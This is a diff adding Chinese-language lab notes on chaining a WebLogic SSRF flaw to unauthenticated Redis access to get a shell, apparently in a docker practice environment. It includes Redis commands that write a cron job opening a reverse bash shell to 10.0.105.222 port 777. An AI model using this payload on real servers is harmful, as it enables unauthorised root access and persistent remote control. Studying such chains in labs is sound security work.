@@ -116,3 +116,34 @@ weblogic 从 ssrf 到 redis 未授权访问到getshell
 @ 统一错误信息
 
 避免用户可以根据错误信息来判断远端服务器的端口状态
+
+# Weblogic 从 ssrf 到 getShell
+
+依赖于docker技术
+docker-compose up -d 启动两个docker镜像
+docker ps
+docker exec -it 3963de188db5 "/bin/bash"
+
+linux      
+   crontab           计划任务
+
+访问weblogic
+  http://ip:7001
+
+存在SSRF 漏洞
+
+redis数据库
+  未授权访问 访问redis数据库的时候，不需要提供用户名和密码
+  具有root权限
+  读写文件
+    语法
+```
+set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/10.0.105.222/777 0>&1\n\n\n\n"
+config set dir /etc/
+config set dbfilename crontab
+save
+```
+  读写计划任务文件crontab
+  反弹shell到指定地址
+
+getshell
